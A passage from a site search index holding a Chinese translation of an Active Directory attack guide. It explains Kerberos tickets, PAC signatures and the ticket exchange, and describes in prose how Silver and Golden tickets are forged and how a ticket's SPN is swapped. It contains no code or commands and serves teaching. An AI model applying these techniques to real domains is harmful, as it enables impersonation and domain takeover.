<li>\u5176\u4ed6\u7ec4\uff1aPAC\u5305\u62ec\u5176\u4ed6SID\uff08Extrasid)\uff0c\u5b83\u6307\u7684\u662f\u975e\u57df\u7ec4\uff0c\u53ef\u7528\u4e8e\u57df\u95f4\u8ba4\u8bc1\uff0c\u4ee5\u53ca\u7528\u4e8e\u8868\u793a\u7279\u6b8a\u7279\u5f81\u7684Well-Known SID\u3002</li> </ul> <p>\u9664\u4e86\u7528\u6237\u4fe1\u606f\u4e4b\u5916\uff0cPAC\u8fd8\u5305\u62ec\u591a\u4e2a\u7b7e\u540d\uff0c\u7528\u4e8e\u9a8c\u8bc1PAC\u548c\u7968\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002</p> <ul> <li>\u670d\u52a1\u5668\u7b7e\u540d\uff1aPAC\u5185\u5bb9\u7684\u7b7e\u540d\uff0c\u6240\u521b\u5efa\u7684\u5bc6\u94a5\u4e0e\u7528\u4e8e\u52a0\u5bc6\u7968\u8bc1\u7684\u5bc6\u94a5\u76f8\u540c\u3002</li> <li>KDC\u7b7e\u540d\uff1a\u4f7f\u7528KDC\u5bc6\u94a5\u521b\u5efa\u7684\u670d\u52a1\u5668\u7b7e\u540d\u7684\u7b7e\u540d\uff0c\u53ef\u7528\u4e8e\u68c0\u67e5PAC\u662f\u5426\u7531KDC\u521b\u5efa\uff0c\u4ee5\u9632\u5fa1Silver\u7968\u653b\u51fb\uff0c\u4f46\u672a\u88ab\u68c0\u67e5\u3002</li> <li>\u7968\u8bc1\u7b7e\u540d\uff1a\u4f7f\u7528KDC\u5bc6\u94a5\u521b\u5efa\u7684\u7968\u8bc1\u5185\u5bb9\u7684\u7b7e\u540d\u3002\u8be5\u7b7e\u540d\u662f\u6700\u8fd1\u4e3a\u9632\u5fa1Bronze\u4f4d\u653b\u51fb\u800c\u5f15\u5165\u7684\u3002</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-actors","title":"Kerberos actors","text":"<p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0cKerberos\u4f7f\u7528\u7968\u8bc1\u6839\u636e\u670d\u52a1\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u4f46\u5b83\u4eec\u662f\u5982\u4f55\u4f7f\u7528\u8fd9\u4e9b\u7968\u8bc1\u7684\u5462\uff1f\u4e3a\u4e86\u56de\u7b54\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u9996\u5148\u5e94\u8be5\u77e5\u9053Kerberos\u8eab\u4efd\u9a8c\u8bc1\u6d89\u53ca\u54ea\u4e9b\u89d2\u8272\u3002</p> <p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u7b2c\u4e00\u4e2a\u89d2\u8272\u5c31\u662f\u5ba2\u6237\u7aef\uff0c\u5373\u63a5\u6536\u5e76\u4f7f\u7528\u7968\u8bc1\u6765\u8bbf\u95ee\u57df\uff08\u6216\u6797\u4e2d\uff09\u4e2d\u7684\u670d\u52a1\u7684\u7528\u6237\u3002</p> <p>\u7136\u540e\uff0c\u6211\u4eec\u5f00\u59cb\u4ecb\u7ecd\u7b2c\u4e8c\u4e2a\u89d2\u8272\uff0c\u5373\u670d\u52a1\u3002\u55ef\uff0c\u5c31\u662f\u8c08\u8bbaKerberos\u65f6\u901a\u5e38\u6240\u8bf4\u7684AP\uff08Application Server\uff09\uff0c\u5373\u63d0\u4f9b\u7528\u6237\u60f3\u8981\u8bbf\u95ee\u7684\u670d\u52a1\u7684\u673a\u5668\u3002AP\u53ef\u4ee5\u662f\u57df\u4e2d\u7684\u4efb\u4f55\u8ba1\u7b97\u673a\u3002</p> <p>\u6700\u540e\uff0c\u6211\u4eec\u9700\u8981\u6709\u4eba\u63d0\u4f9b\u7968\u8bc1\u7ed9\u7528\u6237\uff0c\u5373KDC\uff08Key Distribution Center\uff0c\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\uff09\u3002\u60a8\u53ef\u80fd\u5df2\u7ecf\u731c\u5230\uff0c\u5728Active Directory\u4e2d\uff0cKDC\u5c31\u662f\u57df\u63a7\u5236\u5668\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u8bbf\u95ee\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u6240\u9700\u7684\u57df\u6570\u636e\u5e93\u3002</p> <p>\u5728Kerberos\u4e2d\uff0cTGT\u662f\u7531AS\uff08Authentication Service/Server\uff0c\u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1/\u670d\u52a1\u5668)\u63d0\u4f9b\u7684\uff0cST\u5219\u6240\u7531TGS\uff08Ticket-Granting Service/Server\uff0c\u7968\u8bc1\u6388\u4e88\u670d\u52a1/\u670d\u52a1\u5668)\u63d0\u4f9b\u7684\u3002\u8fd9\u4e24\u4e2a\u670d\u52a1\u90fd\u4f1a\u5411KDC\u8bf7\u6c42Kerberos\u5bc6\u94a5\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u6240\u6709\u8fd9\u4e9b\u670d\u52a1\u901a\u5e38\u8fd0\u884c\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u4e3a\u4e86\u7b80\u5355\u8d77\u89c1\uff0c\u5c06\u5b83\u4eec\u7edf\u79f0\u4e3aKDC\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ticket-types","title":"Ticket types","text":"<p>\u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u5ba2\u6237\u7aef\u3001AP\u3001KDC\u548c\u7968\u8bc1\uff0c\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u770b\u770bKerberos\u534f\u8bae\u5230\u5e95\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u3002\u4e3a\u6b64\u6211\u4eec\u5e94\u8be5\u7262\u8bb0\uff0cKerberos\u534f\u8bae\u4e2d\u6709\u4e24\u79cd\u7c7b\u578b\u7684\u7968\u8bc1\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#st","title":"ST","text":"<p>\u7b2c\u4e00\u79cd\u662fST(Service tickets\uff0c\u670d\u52a1\u7968\u8bc1)\uff0c\u5ba2\u6237\u7aef\u4e3a\u4e86\u83b7\u5f97\u5bf9AP/\u670d\u52a1/\u4e3b\u4f53\u7684\u8bbf\u95ee\u6743\u9650\u800c\u5411\u5176\u51fa\u793a\u7684\u7968\u8bc1\u3002KDC\u5c06\u4e3a\u5411\u5176\u53d1\u9001\u8bf7\u6c42\u7684\u5ba2\u6237\u9881\u53d1ST\u3002</p> <p>\u5728\u8bb8\u591a\u5176\u4ed6\u51fa\u7248\u7269\u4e2d\uff0cST\u6709\u65f6\u88ab\u79f0\u4e3aTGS\u3002\u4f46\u5728rfc4120\u6587\u6863\u4e2d\uff0cTGS\u6307\u7684\u662f\u63d0\u4f9b\u670d\u52a1\u7968\u8bc1\u7684\u670d\u52a1\u3002\u6211\u8ba4\u4e3aST\u88ab\u79f0\u4e3aTGS\u53ef\u80fd\u662f\u7531\u4e8e\u5bf9Ticket-Granting Service\uff08\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff09\u8fd9\u4e00\u672f\u8bed\u7684\u8bef\u89e3\u6240\u81f4\uff1a\u4eba\u4eec\u53ef\u80fd\u8ba4\u4e3a\u5b83\u6307\u7684\u662f\u6388\u4e88\u670d\u52a1\u7684\u7968\u8bc1\uff08\u5c31\u50cf\u6211\u8fc7\u53bb\u6240\u8ba4\u4e3a\u7684\u90a3\u6837\uff09\uff0c\u4f46\u5b9e\u9645\u4e0a\u6307\u7684\u662f\u6388\u4e88\u7968\u8bc1\u7684\u670d\u52a1\u3002\u603b\u4e4b\uff0c\u5982\u679c\u5176\u4ed6\u51fa\u7248\u7269\u6216\u5de5\u5177\u5728\u8c08\u8bbaTGS\u65f6\uff0c\u6709\u53ef\u80fd\u662f\u6307\u7528\u4e8e\u83b7\u5f97\u670d\u52a1\u8bbf\u95ee\u6743\u9650\u7684\u7968\u8bc1\u3002</p> <p>\u5728Active Directory\u4e2d\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u4e3a\u57df\u6570\u636e\u5e93\u4e2d\u6ce8\u518c\u7684\u4efb\u4f55\u670d\u52a1\u83b7\u53d6ST\uff0c\u5373\u4f7f\u7528\u6237\u4e0d\u80fd\u8bbf\u95ee\u8be5\u670d\u52a1\uff08Kerberos\u4e0d\u5904\u7406\u6388\u6743\uff09\uff0c\u6216\u8005\u5373\u4f7f\u8be5\u670d\u52a1\u6ca1\u6709\u8fd0\u884c\uff0c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002</p> <p>ST\u5e94\u8be5\u7531\u76ee\u6807\u4e3b\u4f53/\u670d\u52a1\u800c\u4e0d\u662f\u5176\u4ed6\u65b9\u8bfb\u53d6\uff0c\u56e0\u4e3a\u5b83\u4eec\u5305\u542b\u9700\u8981\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u5ba2\u6237\u7aef\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e0e\u5ba2\u6237\u7aef\u5efa\u7acb\u8fde\u63a5\u7684\u4f1a\u8bdd\u5bc6\u94a5\u3002\u56e0\u6b64\uff0c\u9700\u8981\u4f7f\u7528\u76ee\u6807\u4e3b\u4f53\u7684\u5bc6\u94a5\u5bf9ST\u8fdb\u884c\u52a0\u5bc6\u5904\u7406\u3002</p> <p>\u5bf9\u4e8eActive Directory\uff0c\u76ee\u6807\u4e3b\u4f53\u901a\u5e38\u662f\u6307\u5c5e\u4e8e\u7528\u6237\u5e10\u6237\uff08\u6216\u8ba1\u7b97\u673a\u5e10\u6237\uff0c\u4e5f\u662fActive Directory\u4e2d\u7684\u7528\u6237\uff09\u7684\u670d\u52a1\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cTGT\u662f\u901a\u8fc7\u670d\u52a1\u7684\u5e10\u6237\u6240\u6709\u8005\u7684\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\u3002</p> <p>\u4ece\u8fd9\u4e9b\u4fe1\u606f\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\u4ee5\u4e0b\u51e0\u70b9\uff1a</p> <p>\u9996\u5148\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u76ee\u6807\u4e3b\u4f53\u7684\u5bc6\u94a5\uff08\u4ece\u5bc6\u7801\u4e2d\u5bfc\u51fa\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f2a\u9020\u8be5\u4e3b\u4f53\u7684\u7968\u8bc1\u3002\u5c31Active Directory\u800c\u8a00\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u67d0\u4e2a\u7528\u6237\u7684\u5bc6\u94a5\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u521b\u5efa\u81ea\u5b9a\u4e49\u7968\u8bc1\u6765\u8bbf\u95ee\u8be5\u7528\u6237\u7684\u4efb\u4f55\u670d\u52a1\u3002\u8fd9\u4e9b\u5b9a\u5236\u7684\u7968\u8bc1\u88ab\u79f0\u4e3a\u94f6\u7968\uff08Silver ticket\uff09\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u77e5\u9053\u8ba1\u7b97\u673a\u5e10\u6237\u7684\u5bc6\u7801\uff08\u901a\u5e38\u5b58\u50a8\u5728\u673a\u5668\u7684LSA\u79d8\u5bc6\u4e2d\uff09\uff0c\u5c31\u53ef\u4ee5\u4e3a\u673a\u5668\u7684SMB\u670d\u52a1\u521b\u5efa\u94f6\u7968\uff0c\u5e76\u50cf\u7ba1\u7406\u5458\u4e00\u6837\u8bbf\u95ee\u673a\u5668\u3002</p> <p>\u4f46\u662f\uff0c\u60a8\u53ef\u80fd\u4f1a\u6ce8\u610f\u5230\u7968\u8bc1PAC\u7684KDC\u7b7e\u540d\u662f\u7528KDC\u5bc6\u94a5\u7b7e\u540d\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u771f\u5b9e\u7684\u7968\u8bc1\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u4f46\u662f\uff0c\u670d\u52a1\u5e76\u4e0d\u4f1a\u68c0\u67e5KDC\u7b7e\u540d\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u95ee\u9898\u662f\uff0c\u5982\u679c\u51e0\u4e2a\u670d\u52a1\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7528\u6237\uff0c\u5b83\u4eec\u5c06\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u3002\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u4fe1\u606f\u4ee5\u53ca\u7968\u8bc1\u7684\u76ee\u6807\u670d\u52a1\u662f\u5728\u7968\u8bc1\u7684\u975e\u52a0\u5bc6\u90e8\u5206\uff08sname\u5b57\u6bb5\uff09\u4e2d\u6307\u5b9a\u7684\u8fd9\u4e00\u4e8b\u5b9e\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60a8\u5c06\u7968\u8bc1\u7684\u76ee\u6807\u670d\u52a1\u6539\u4e3a\u540c\u4e00\u7528\u6237\u7684\u53e6\u4e00\u4e2a\u670d\u52a1\uff0c\u8be5\u7968\u8bc1\u5c31\u80fd\u7528\u4e8e\u65b0\u7684\u76ee\u6807\u670d\u52a1\u3002</p> <p>\u8fd9\u79cd\u6280\u672f\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u53ef\u80fd\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u80fd\u591f\u4e3amachineA\u4e2d\u7684MSSQL\u6570\u636e\u5e93\u7684\u7ba1\u7406\u5458\u7533\u8bf7ST(SPN=MSSQLSVC\\machineA)\uff0c\u60a8\u5c31\u53ef\u4ee5\u4fee\u6539\u8be5\u670d\u52a1\uff0c\u4ee5\u4f7f\u5176\u6307\u5411\u540c\u4e00\u53f0\u673a\u5668\u7684SMB\u670d\u52a1(SPN=CIFS\\machineA)\uff0c\u4ece\u800c\u83b7\u5f97\u8be5\u673a\u5668\u7684\u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#tgt","title":"TGT","text":"<p>\u4e3a\u4e86\u4eceKDC\u83b7\u5f97ST\uff0c\u7528\u6237\u9700\u8981\u51fa\u793a\u53e6\u4e00\u79cd\u7c7b\u578b\u7684\u7968\u8bc1\uff0c\u5373TGT\uff08\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff09\u3002TGT\u5c31\u50cf\u662fKDC\u7684ST\uff08\u4e8b\u5b9e\u4e0a\uff0c\u4ec5\u6b64\u800c\u5df2\uff09\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u6309\u7167\u53ea\u5141\u8bb8\u76ee\u6807\u4e3b\u4f53\u8bbf\u95ee\u7968\u8bc1\u7684\u539f\u5219\uff0c\u6240\u6709TGT\u90fd\u5fc5\u987b\u4f7f\u7528\u57df\u7684krbtgt\u5e10\u6237\u7684\u5bc6\u94a5\uff08\u79f0\u4e3aKDC\u5bc6\u94a5\uff09\u8fdb\u884c\u52a0\u5bc6\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60a8\u80fd\u591f\u68c0\u7d22krbtgt\u7684\u5bc6\u94a5\uff08\u901a\u5e38\u5b58\u50a8\u5728\u57df\u6570\u636e\u5e93\u4e2d\uff09\uff0c\u60a8\u5c31\u53ef\u4ee5\u521b\u5efa\u79f0\u4e3a\u91d1\u7968\uff08Golden Tickets\uff09\u7684\u81ea\u5b9a\u4e49TGT\u3002</p> <p>\u7531\u4e8e\u53ef\u4ee5\u4e3a\u4efb\u4f55\u5ba2\u6237\u7aef\u521b\u5efa\u7968\u8bc1\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5192\u5145\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\uff0c\u5305\u62ec\u7ba1\u7406\u5458\u3002\u91d1\u7968\u751a\u81f3\u53ef\u4ee5\u901a\u8fc7\u5728PAC\u4e2d\u8bbe\u7f6e\u7279\u6b8a\u7279\u6743SID\uff0c\u6bd4\u5982\u4f01\u4e1a\u7ba1\u7406\u5458\uff0c\u6765\u7834\u574f\u6574\u4e2a\u6797\u7684\u9632\u5fa1\u4f53\u7cfb\u3002</p> <p>\u4e4b\u6240\u4ee5\u80fd\u591f\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u662f\u56e0\u4e3aPAC\u5305\u542b\u4e0e\u7528\u6237\u76f8\u5173\u7684\u5b89\u5168\u6570\u636e\uff0c\u5e76\u4e14\u4e0d\u4f1a\u9a8c\u8bc1\u4fe1\u606f\u662f\u5426\u4e3a\u771f\uff08\u81f3\u5c11\u5728\u7968\u8bc1\u8fc7\u671f20\u5206\u949f\u4e4b\u524d\u662f\u8fd9\u6837\u7684\uff09\uff0c\u56e0\u6b64\uff0c\u60a8\u53ef\u4ee5\u5c06\u4efb\u4f55\u7528\u6237\u6dfb\u52a0\u5230\u7968\u8bc1\u4e2d\u7684\u4efb\u4f55\u7ec4\uff0c\u751a\u81f3\u53ef\u4ee5\u4e3a\u4e0d\u5b58\u5728\u7684\u7528\u6237\u521b\u5efa\u7968\u8bc1\u3002</p> <p>\u4e3a\u4e86\u83b7\u5f97TGT\uff0c\u901a\u5e38\u9700\u8981\u4f7f\u7528KDC\u7684\u51ed\u636e\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ticket-acquisition","title":"Ticket acquisition","text":"<p>\u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u4e86ST\u548cTGT\uff0c\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u6df1\u5165\u7814\u7a76Kerberos\u5230\u5e95\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u5373\u7968\u8bc1\u662f\u5982\u4f55\u9881\u53d1\u7684\uff1a</p> <pre><code>                          `KDC (DC)    .-----&gt;-1) AS-REQ-------&gt;   .---.    |                          /   /| -------8] PAC Response-----------.    | .--&lt;-2) AS-REP (TGT)--&lt; .---. |                                  |    | |                       |   | '                                  |    | | .&gt;-4) TGS-REQ (TGT)-&gt; |   |/  &lt;-7] KERB_VERIFY_PAC_REQUEST-.   |    | | |                     '---'                                |   |    | | | .&lt;-5) TGS-REP (ST)--&lt;'                                   |   |    | | | |                                                        |   v    | v | v                                                        ^       ^   ^                                                          .---.     _____                                                        /   /|    |     |   &lt;----3) Authentication negotiation (SPNEGO)----&gt;   .---. |    |_____|                                                      |   | '    /:::::/   &gt;-------------------6) AP-REQ (ST)-------------&gt;   |   |/     client                                                       '---'                &lt;-------------------9] AP-REP------------------&lt;  AP (service)`\n</code></pre> <p>Kerberos\u7684\u8fd0\u884c\u539f\u7406</p> <p>\u5ba2\u6237\u7aef\u901a\u8fc7\u53d1\u9001AS-REQ\u6d88\u606f\u5411ASKDC\uff09\u8bf7\u6c42TGT\u3002\u5728AS-REQ\u6d88\u606f\u4e2d\uff0c\u5ba2\u6237\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u7528\u5176Kerberos\u5bc6\u94a5\u52a0\u5bc6\u7684\u65f6\u95f4\u6233\u3002\u8fd9\u88ab\u79f0\u4e3aKerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u6709\u65f6\u5e76\u4e0d\u662f\u5fc5\u987b\u7684\u3002 * AS\uff08KDC\uff09\u4f1a\u68c0\u67e5\u65f6\u95f4\u6233\uff08\u6216\u4e0d\u8fdb\u884c\u68c0\u67e5\uff09\uff0c\u5e76\u4ee5AS-REP\u6d88\u606f\u4f5c\u4e3a\u54cd\u5e94\uff0c\u8be5\u6d88\u606f\u5305\u542b\u4e24\u4e2a\u52a0\u5bc6\u90e8\u5206\uff1a\u7528KDC\u5bc6\u94a5\u52a0\u5bc6\u7684TGT\u548c\u7528\u5ba2\u6237\u5bc6\u94a5\u52a0\u5bc6\u7684\u5ba2\u6237\u6570\u636e\u3002\u4f1a\u8bdd\u5bc6\u94a5\u7b49\u82e5\u5e72\u4fe1\u606f\u5c06\u88ab\u62f7\u8d1d\u5230\u8fd9\u4e24\u90e8\u5206\u4e2d\uff0c\u56e0\u6b64\uff0c\u7528\u6237\u548cKDC\u90fd\u53ef\u4ee5\u5171\u4eab\u8fd9\u90e8\u5206\u4fe1\u606f\u3002 * \u4e4b\u540e\uff0c\u5ba2\u6237\u7aef\u4e0eAP\u4e2d\u7684\u670d\u52a1\u5efa\u7acb\u8fde\u63a5\uff0c\u5e76\u4e0eSPNEGO\u534f\u5546\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u3002\u5982\u679c\u9009\u62e9Kerberos\u534f\u8bae\uff0c\u5ba2\u6237\u7aef\u9700\u8981\u4e3a\u76ee\u6807\u670d\u52a1\u7533\u8bf7ST\u3002 * \u56e0\u6b64\uff0c\u5b83\u901a\u8fc7\u53d1\u9001\u5305\u62ec\u5176TGT\u548c\u76ee\u6807\u670d\u52a1\u7684SPN\u7684TGS-REQ\uff0c\u5411KDC\u8bf7\u6c42ST\u3002\u540c\u65f6\uff0c\u5b83\u8fd8\u4f1a\u53d1\u9001\u4e00\u4e9b\u7ecf\u8fc7\u4f1a\u8bdd\u5bc6\u94a5\u52a0\u5bc6\u7684\u6570\u636e\uff0c\u5982\u5ba2\u6237\u7684\u7528\u6237\u540d\u548c\u65f6\u95f4\u6233\uff0c\u4ee5\u9a8c\u8bc1\u8fde\u63a5\u3002 * KDC\u7528\u5176\u5bc6\u94a5\u5bf9TGT\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ece\u800c\u83b7\u5f97\u7528\u6237\u540d\u548c\u4f1a\u8bdd\u5bc6\u94a5\u3002\u7136\u540e\uff0cKDC\u4f7f\u7528\u4f1a\u8bdd\u5bc6\u94a5\u6765\u89e3\u5bc6\u7528\u6237\u53d1\u9001\u7684\u7528\u6237\u540d\uff0c\u4ee5\u9a8c\u8bc1\u5176\u6b63\u786e\u6027\u3002\u5728\u6838\u5bf9\u4e00\u5207\u65e0\u8bef\u540e\uff0cKDC\u5c06\u4ee5TGS-REP\u6d88\u606f\u8fdb\u884c\u54cd\u5e94\uff0c\u8be5\u6d88\u606f\u5305\u542b\u4e24\u4e2a\u52a0\u5bc6\u90e8\u5206\uff1a\u7528\u670d\u52a1\u7528\u6237\u5bc6\u94a5\u52a0\u5bc6\u7684\u76ee\u6807\u670d\u52a1ST\uff0c\u4ee5\u53ca\u7528\u4f1a\u8bdd\u5bc6\u94a5\u52a0\u5bc6\u7684\u5ba2\u6237\u6570\u636e\u3002\u5e76\u4e14\uff0c\u8fd8\u4f1a\u5c06\u67d0\u4e9b\u4fe1\u606f\uff0c\u5982\u670d\u52a1\u4f1a\u8bdd\u5bc6\u94a5\u62f7\u8d1d\u5230\u8fd9\u4e24\u90e8\u5206\u4e2d\uff0c\u56e0\u6b64\uff0c\u7528\u6237\u548c\u670d\u52a1\u90fd\u53ef\u4ee5\u5171\u4eab\u8fd9\u4e9b\u4fe1\u606f\u3002 * \u5ba2\u6237\u7aef\u5728AP-REQ\u6d88\u606f\u4e2d\u5411\u8be5\u670d\u52a1\u53d1\u9001ST\u3002\u8be5\u670d\u52a1\u5c06\u4f1a\u5bf9ST\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ece\u800c\u5f97\u5230\u670d\u52a1\u4f1a\u8bdd\u5bc6\u94a5\u548cPAC\u3002\u4e4b\u540e\uff0c\u8be5\u670d\u52a1\u5c06\u4f7f\u7528\u5173\u4e8e\u5ba2\u6237\u7aef\u7684PAC\u7684\u5b89\u5168\u4fe1\u606f\u6765\u786e\u5b9a\u7528\u6237\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u5176\u8d44\u6e90\u3002 * (\u53ef\u9009\uff09\u5982\u679c\u8be5\u670d\u52a1\u60f3\u9a8c\u8bc1PAC\uff0c\u5b83\u53ef\u4ee5\u4f7f\u7528Netlogon\u534f\u8bae\u8981\u6c42DC\u7528KERB_VERIFY_PAC_REQUEST\u6765\u9a8c\u8bc1PAC\u7b7e\u540d\u3002 * (\u53ef\u9009\uff09\u670d\u52a1\u5668\u5c06\u68c0\u67e5PAC\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u4ee3\u7801\u4f5c\u4e3a\u54cd\u5e94\uff0c\u6307\u51faPAC\u662f\u5426\u6b63\u786e\u3002 * (\u53ef\u9009\uff09\u6700\u540e\uff0c\u5982\u679c\u5ba2\u6237\u7aef\u9700\u8981\u7684\u8bdd\uff0c\u670d\u52a1\u8fd8\u5fc5\u987b\u901a\u8fc7AP-REP\u6d88\u606f\u6765\u54cd\u5e94AP-REQ\u6d88\u606f\uff0c\u4ece\u800c\u5bf9\u81ea\u5df1\u7684\u8eab\u4efd\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5e76\u7528\u4f1a\u8bdd\u5bc6\u94a5\u6765\u8bc1\u660e\u670d\u52a1\u53ef\u4ee5\u89e3\u5bc6ST\uff0c\u4ee5\u6b64\u8bc1\u660e\u5b83\u5c31\u662f\u771f\u6b63\u7684\u670d\u52a1\u800c\u4e0d\u662f\u5192\u724c\u7684\u3002</p> <p>\u4ece\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u6ce8\u610f\u5230Kerberos\u4e0eNTLM\u6709\u6240\u4e0d\u540c\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5176\u4ed6\u5e94\u7528\u534f\u8bae\u4e2d\u6ca1\u6709\u63d0\u4f9b\u7684\u6d88\u606f\uff0c\u6bd4\u5982AS-REQ\u548cTGS-REQ\uff0c\u5b83\u4eec\u4f1a\u88ab\u76f4\u63a5\u53d1\u9001\u7ed9DC\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-services","title":"Kerberos services","text":"<p>DC\u5c06\u572888/TCP\u548c88/UDP\u7aef\u53e3\u4e0a\u76d1\u542cKerberos\u534f\u8bae\u7684\u6d88\u606f\u3002</p> <pre><code>                       `.-----                            |                          .---             .----KDC---&gt; | 88             |            '---   Domain  Kerberos --|              |             |            .---  Controller             '-kpasswd--&gt; | 464                          '---                            |                            '-----`\n</code></pre> <p>Kerberos\u534f\u8bae\u7684\u76f8\u5173\u7aef\u53e3</p> <p>\u9664\u4e86KDC\u4e4b\u5916\uff0cKerberos\u534f\u8bae\u8fd8\u63d0\u4f9b\u4e86\u53e6\u4e00\u4e2a\u670d\u52a1kpasswd\uff0c\u53ef\u7528\u4e8e\u4fee\u6539\u57df\u4e2d\u7528\u6237\u7684\u5bc6\u7801\u3002\u5b9e\u9645\u4e0a\uff0c\u670d\u52a1kpasswd\u53ef\u4ee5\u5728DC\u7684\u7aef\u53e3464/TCP\u548c464/UDP\u4e2d\u627e\u5230\u3002\u5b83\u53ef\u4ee5\u4e0e\u5b9e\u7528\u5de5\u5177ksetup\u4e00\u8d77\u4f7f\u7528\uff0c\u8fd9\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7Ctrl+Alt+Del\u5feb\u6377\u952e\u8c03\u51fa\u201cChange a password\u201d\u5c4f\u5e55\u8fdb\u884c\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u4e0eRubeus changepw\u4e00\u8d77\u4f7f\u7528\u3002</p> <p></p> <p>\u901a\u8fc7kpasswd\u4f7f\u7528\u4fee\u6539\u5bc6\u7801\u5de5\u5177</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-keys","title":"Kerberos keys","text":"<p>\u901a\u8fc7\u4fee\u6539\u5bc6\u7801\uff0c\u7528\u6237\u53ef\u4ee5\u66f4\u6539\u7528\u4e8e\u52a0\u5bc6Kerberos\u6d88\u606f\u548c\u7968\u8bc1\u7684Kerberos\u5bc6\u94a5\u3002</p> 